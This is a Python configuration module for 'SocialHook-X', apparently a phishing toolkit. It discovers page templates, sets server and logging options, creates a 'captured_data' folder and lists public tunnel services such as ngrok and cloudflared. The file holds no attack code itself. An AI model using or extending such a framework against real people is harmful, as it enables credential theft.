"""
SocialHook-X Configuration Package
Centralized runtime and project configuration.
"""

import os
import secrets
from pathlib import Path
from typing import Dict, List, Tuple

from .servers import ServerConfig
from .templates import TemplateConfig


def _label_from_template_key(key: str) -> str:
    """Create a display label from a template directory key."""
    return key.replace("_", " ").title()


def _discover_templates(templates_dir: Path) -> Dict[str, str]:
    """Discover templates from disk and merge with configured metadata."""
    templates: Dict[str, str] = {}

    # Prefer curated labels where available.
    for key, meta in TemplateConfig.TEMPLATES.items():
        templates[key] = meta.get("name", _label_from_template_key(key))

    # Include any additional directories present on disk.
    if templates_dir.exists():
        for entry in sorted(templates_dir.iterdir(), key=lambda p: p.name):
            if entry.is_dir() and entry.name not in templates:
                templates[entry.name] = _label_from_template_key(entry.name)

    return templates


class Config:
    """Application configuration."""

    PROJECT_NAME = "SocialHook-X"
    VERSION = "4.0"
    AUTHOR = "Security Research"

    BASE_DIR = Path(__file__).resolve().parents[2]
    CORE_DIR = BASE_DIR / "core"
    TEMPLATES_DIR = BASE_DIR / "templates"
    SERVERS_DIR = BASE_DIR / "servers"
    OUTPUT_DIR = BASE_DIR / "output"
    CAPTURED_DIR = BASE_DIR / "captured_data"
    THIRD_PARTY_DIR = BASE_DIR / "third_party"

    HOST = os.getenv("SHX_HOST", "127.0.0.1")
    PORT = int(os.getenv("SHX_PORT", "8080"))
    DEBUG = os.getenv("SHX_DEBUG", "false").lower() == "true"

    DATABASE = str(OUTPUT_DIR / "socialhook.db")
    SECRET_KEY = os.getenv("SHX_SECRET_KEY", secrets.token_hex(32))

    LOG_LEVEL = os.getenv("SHX_LOG_LEVEL", "INFO")
    LOG_FILE = str(OUTPUT_DIR / "socialhook.log")

    TUNNEL_TIMEOUT = int(os.getenv("SHX_TUNNEL_TIMEOUT", "30"))
    DEFAULT_TUNNEL = os.getenv("SHX_DEFAULT_TUNNEL", "localhost")

    AVAILABLE_TEMPLATES = _discover_templates(TEMPLATES_DIR)

    TUNNEL_SERVICES = {
        "localhost": "Local Hosting",
        "cloudflared": "Cloudflare Tunnel",
        "localxpose": "LocalXpose",
        "ngrok": "Ngrok",
        "localhostrun": "localhost.run",
    }

    API_TIMEOUT = 30
    MAX_RETRIES = 3

    @classmethod
    def ensure_directories(cls) -> None:
        """Ensure runtime directories exist."""
        for directory in [cls.TEMPLATES_DIR, cls.SERVERS_DIR, cls.OUTPUT_DIR, cls.CAPTURED_DIR]:
            directory.mkdir(parents=True, exist_ok=True)

    @classmethod
    def get_template_list(cls) -> List[Tuple[int, str, str]]:
        """Get list of available templates."""
        templates_list: List[Tuple[int, str, str]] = []
        for idx, (key, name) in enumerate(cls.AVAILABLE_TEMPLATES.items(), 1):
            templates_list.append((idx, key, name))
        return templates_list

    @classmethod
    def validate_template(cls, template: str) -> bool:
        """Validate template exists."""
        return template in cls.AVAILABLE_TEMPLATES

    @classmethod
    def get_output_file(cls, name: str, extension: str = "txt") -> str:
        """Generate output file path."""
        return str(cls.OUTPUT_DIR / f"{name}.{extension}")


class DevelopmentConfig(Config):
    """Development environment configuration."""

    DEBUG = True
    LOG_LEVEL = "DEBUG"


class ProductionConfig(Config):
    """Production environment configuration."""

    DEBUG = False
    LOG_LEVEL = "WARNING"


ENV = os.getenv("SHX_ENV", "development").lower()
if ENV == "production":
    config = ProductionConfig()
else:
    config = DevelopmentConfig()

config.ensure_directories()

__all__ = [
    "Config",
    "DevelopmentConfig",
    "ProductionConfig",
    "config",
    "TemplateConfig",
    "ServerConfig",
]
